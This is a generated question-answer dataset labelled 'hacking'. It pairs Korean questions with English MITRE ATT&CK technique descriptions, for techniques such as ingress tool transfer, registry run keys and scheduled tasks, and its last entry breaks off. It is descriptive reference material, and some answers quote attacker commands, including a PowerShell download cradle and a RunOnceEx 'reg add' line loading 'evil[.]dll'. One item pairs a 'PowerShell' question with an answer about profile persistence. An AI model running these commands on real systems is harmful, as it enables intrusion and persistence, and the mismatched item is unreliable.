{
  "metadata": {
    "domain": "hacking",
    "total_samples": 512,
    "generated_at": "2025-10-29T12:44:38.628044",
    "difficulty_distribution": {
      "easy": 150,
      "medium": 212,
      "hard": 150
    }
  },
  "qa_samples": [
    {
      "question": "Ingress Tool Transfer 공격 기법은 무엇인가?",
      "answer": "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil](https://attack.mitre.org/software/S0160), and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas)  A number of these tools, such as `wget`, `curl`, and `scp`, also exist on ESXi. After downloading a file, a threat actor may attempt to verify its integrity by checking its hash value (e.g., via `certutil -hashfile`).(Citation: Google Cloud Threat Intelligence COSCMICENERGY 2023)\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution](https://attack.mitre.org/techniques/T1204) (typically after interacting with [Phishing](https://attack.mitre.org/techniques/T1566) lures).(Citation: T1105: Trellix_search-ms)\n\nFiles can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.(Citation: PTSecurity Cobalt Dec 2016) In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.(Citation: Dropbox Malware Sync)",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1105",
        "entity_id": "attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add"
      }
    },
    {
      "question": "Web Protocols 공격 기법은 무엇인가?",
      "answer": "Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S(Citation: CrowdStrike Putter Panda) and WebSocket(Citation: Brazking-Websockets) that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1071.001",
        "entity_id": "attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161"
      }
    },
    {
      "question": "System Information Discovery 공격 기법은 무엇인가?",
      "answer": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use this information to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. This behavior is distinct from [Local Storage Discovery](https://attack.mitre.org/techniques/T1680) which is an adversary's discovery of local drive, disks and/or volumes.\n\nTools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. Adversaries may leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather detailed system information (e.g. <code>show version</code>).(Citation: US-CERT-TA18-106A) On ESXi servers, threat actors may gather system information from various esxcli utilities, such as `system hostname get` and `system version get`.(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)(Citation: Varonis)\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)\n\n[System Information Discovery](https://attack.mitre.org/techniques/T1082) combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.(Citation: OSX.FairyTale)(Citation: 20 macOS Common Tools and Techniques) ",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1082",
        "entity_id": "attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1"
      }
    },
    {
      "question": "Windows Command Shell 공격 기법은 무엇인가?",
      "answer": "Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: SSH in Windows)\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage [cmd](https://attack.mitre.org/software/S0106) to execute various commands and payloads. Common uses include [cmd](https://attack.mitre.org/software/S0106) to execute a single command, or abusing [cmd](https://attack.mitre.org/software/S0106) interactively with input and output forwarded over a command and control channel.",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1059.003",
        "entity_id": "attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62"
      }
    },
    {
      "question": "File and Directory Discovery 공격 기법은 무엇인가?",
      "answer": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>.(Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the [Native API](https://attack.mitre.org/techniques/T1106). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).(Citation: US-CERT-TA18-106A)\n\nSome files and directories may require elevated or specific user permissions to access.",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1083",
        "entity_id": "attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18"
      }
    },
    {
      "question": "Deobfuscate/Decode Files or Information 공격 기법은 무엇인가?",
      "answer": "Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file.(Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <code>copy /b</code> or <code>type</code> command to reassemble binary fragments into a malicious payload.(Citation: Carbon Black Obfuscation Sept 2016)(Citation: Sentinel One Tainted Love 2023)\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.(Citation: Volexity PowerDuke November 2016)",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1140",
        "entity_id": "attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c"
      }
    },
    {
      "question": "Process Discovery 공격 기법은 무엇인가?",
      "answer": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the [Tasklist](https://attack.mitre.org/software/S0057) utility via [cmd](https://attack.mitre.org/software/S0106) or <code>Get-Process</code> via [PowerShell](https://attack.mitre.org/techniques/T1059/001). Information about processes can also be extracted from the output of [Native API](https://attack.mitre.org/techniques/T1106) calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via `/proc`. ESXi also supports use of the `ps` command, as well as `esxcli system process list`.(Citation: Sygnia ESXi Ransomware 2025)(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)\n\nOn network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show processes` can be used to display current running processes.(Citation: US-CERT-TA18-106A)(Citation: show_processes_cisco_cmd)",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1057",
        "entity_id": "attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580"
      }
    },
    {
      "question": "File Deletion 공격 기법은 무엇인가?",
      "answer": "Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native [cmd](https://attack.mitre.org/software/S0106) functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools. (Citation: Trend Micro APT Attack Tools)",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1070.004",
        "entity_id": "attack-pattern--d63a3fb8-9452-4e9d-a60a-54be68d5998c"
      }
    },
    {
      "question": "System Network Configuration Discovery 공격 기법은 무엇인가?",
      "answer": "Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).\n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).(Citation: US-CERT-TA18-106A)(Citation: Mandiant APT41 Global Intrusion ) On ESXi, adversaries may leverage esxcli to gather network configuration information. For example, the command `esxcli network nic list` will retrieve the MAC address, while `esxcli network ip interface ipv4 get` will retrieve the local IPv4 address.(Citation: Trellix Rnasomhouse 2024)\n\nAdversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next. ",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1016",
        "entity_id": "attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0"
      }
    },
    {
      "question": "Registry Run Keys / Startup Folder 공격 기법은 무엇인가?",
      "answer": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nPlacing a program within a startup folder will cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in.\n\nThe startup folder path for the current user is:\n* <code>C:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>\nThe startup folder path for all users is:\n* <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>\n\nThe following run keys are created by default on Windows systems:\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nThe <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. (Citation: Microsoft RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)\n\nThe following Registry keys can be used to set startup folder items for persistence:\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit</code> and <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell</code> subkeys can automatically launch programs.\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run when any user logs on.\n\nBy default, the multistring BootExecute value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1547.001",
        "entity_id": "attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279"
      }
    },
    {
      "question": "System Owner/User Discovery 공격 기법은 무엇인가?",
      "answer": "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show users` and `show ssh` can be used to display users currently logged into the device.(Citation: show_ssh_users_cmd_cisco)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1033",
        "entity_id": "attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104"
      }
    },
    {
      "question": "PowerShell 공격 기법은 무엇인가?",
      "answer": "Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (<code>profile.ps1</code>) is a script that runs when [PowerShell](https://attack.mitre.org/techniques/T1059/001) starts and can be used as a logon script to customize user environments.\n\n[PowerShell](https://attack.mitre.org/techniques/T1059/001) supports several profiles depending on the user or host program. For example, there can be different profiles for [PowerShell](https://attack.mitre.org/techniques/T1059/001) host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer. (Citation: Microsoft About Profiles) \n\nAdversaries may modify these profiles to include arbitrary commands, functions, modules, and/or [PowerShell](https://attack.mitre.org/techniques/T1059/001) drives to gain persistence. Every time a user opens a [PowerShell](https://attack.mitre.org/techniques/T1059/001) session the modified script will be executed unless the <code>-NoProfile</code> flag is used when it is launched. (Citation: ESET Turla PowerShell May 2019) \n\nAn adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator. (Citation: Wits End and Shady PowerShell Profiles)",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1059.001",
        "entity_id": "attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736"
      }
    },
    {
      "question": "Encrypted/Encoded File 공격 기법은 무엇인가?",
      "answer": "Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as [Software Packing](https://attack.mitre.org/techniques/T1027/002), [Steganography](https://attack.mitre.org/techniques/T1027/003), and [Embedded Payloads](https://attack.mitre.org/techniques/T1027/009), share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)) at the time of execution/use.\n\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files.(Citation: File obfuscation) Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding schemes such as Base64.\n\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\n\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a [Phishing](https://attack.mitre.org/techniques/T1566) payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: SFX - Encrypted/Encoded File) \n\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) execution.",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1027.013",
        "entity_id": "attack-pattern--0d91b3c0-5e50-47c3-949a-2a796f04d144"
      }
    },
    {
      "question": "Data from Local System 공격 기법은 무엇인가?",
      "answer": "Adversaries may search local system sources, such as file systems, configuration files, local databases, virtual machine files, or process memory, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco) Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.\n",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1005",
        "entity_id": "attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5"
      }
    },
    {
      "question": "Native API 공격 기법은 무엇인가?",
      "answer": "Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.(Citation: NT API Windows)(Citation: Linux Kernel API) These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\n\nNative API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries.(Citation: OutFlank System Calls)(Citation: CyberBit System Calls)(Citation: MDSec System Calls) For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes.(Citation: Microsoft CreateProcess)(Citation: GNU Fork) This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.(Citation: Microsoft Win32)(Citation: LIBC)(Citation: GLIBC)\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.(Citation: Microsoft NET)(Citation: Apple Core Services)(Citation: MACOS Cocoa)(Citation: macOS Foundation)\n\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks.(Citation: Redops Syscalls) Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001).",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1106",
        "entity_id": "attack-pattern--391d824f-0ef1-47a0-b0ee-c59a75e27670"
      }
    },
    {
      "question": "Match Legitimate Resource Name or Location 공격 기법은 무엇인가?",
      "answer": "Adversaries may match or approximate the name or location of legitimate files, Registry keys, or other resources when naming/placing them. This is done for the sake of evading defenses and observation. \n\nThis may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: `svchost.exe`). Alternatively, a Windows Registry key may be given a close approximation to a key used by a legitimate program. In containerized environments, a threat actor may create a resource in a trusted namespace or one that matches the naming convention of a container pod or cluster.(Citation: Aquasec Kubernetes Backdoor 2023)",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1036.005",
        "entity_id": "attack-pattern--1c4e5d32-1fe9-4116-9d9d-59e3925bd6a2"
      }
    },
    {
      "question": "Exfiltration Over C2 Channel 공격 기법은 무엇인가?",
      "answer": "Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1041",
        "entity_id": "attack-pattern--92d7da27-2d91-488e-a00c-059dc162766d"
      }
    },
    {
      "question": "Malicious File 공격 기법은 무엇인가?",
      "answer": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, .cpl, .reg, and .iso.(Citation: Mandiant Trojanized Windows 10)\n\nAdversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs) \n\nWhile [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1204.002",
        "entity_id": "attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e"
      }
    },
    {
      "question": "Scheduled Task 공격 기법은 무엇인가?",
      "answer": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel.(Citation: Stack Overflow) In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) (WMI) to create a scheduled task. Adversaries may also utilize the Powershell Cmdlet `Invoke-CimMethod`, which leverages WMI class `PS_ScheduledTask` to create a scheduled task via an XML path.(Citation: Red Canary - Atomic Red Team)\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.(Citation: ProofPoint Serpent)\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564)) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).(Citation: SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.(Citation: Defending Against Scheduled Task Attacks in Windows Environments) ",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1053.005",
        "entity_id": "attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9"
      }
    },
    {
      "question": "Symmetric Cryptography 공격 기법은 무엇인가?",
      "answer": "Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1573.001",
        "entity_id": "attack-pattern--24bfaeba-cb0d-4525-b3dc-507c77ecec41"
      }
    },
    {
      "question": "Modify Registry 공격 기법은 무엇인가?",
      "answer": "Adversaries may interact with the Windows Registry as part of a variety of other techniques to aid in defense evasion, persistence, and execution.\n\nAccess to specific areas of the Registry depends on account permissions, with some keys requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification.(Citation: Microsoft Reg) Other tools, such as remote access tools, may also contain functionality to interact with the Registry through the Windows API.\n\nThe Registry may be modified in order to hide configuration information or malicious payloads via [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).(Citation: Unit42 BabyShark Feb 2019)(Citation: Avaddon Ransomware 2021)(Citation: Microsoft BlackCat Jun 2022)(Citation: CISA Russian Gov Critical Infra 2018) The Registry may also be modified to [Impair Defenses](https://attack.mitre.org/techniques/T1562), such as by enabling macros for all Microsoft Office products, allowing privilege escalation without alerting the user, increasing the maximum number of allowed outbound requests, and/or modifying systems to store plaintext credentials in memory.(Citation: CISA LockBit 2023)(Citation: Unit42 BabyShark Feb 2019)\n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.(Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) for RPC communication.\n\nFinally, Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API.(Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.(Citation: TrendMicro POWELIKS AUG 2014)(Citation: SpectorOps Hiding Reg Jul 2017)",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1112",
        "entity_id": "attack-pattern--57340c81-c025-4189-8fa0-fc7ede51bae4"
      }
    },
    {
      "question": "Screen Capture 공격 기법은 무엇인가?",
      "answer": "Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.(Citation: CopyFromScreen .NET)(Citation: Antiquated Mac Malware)\n",
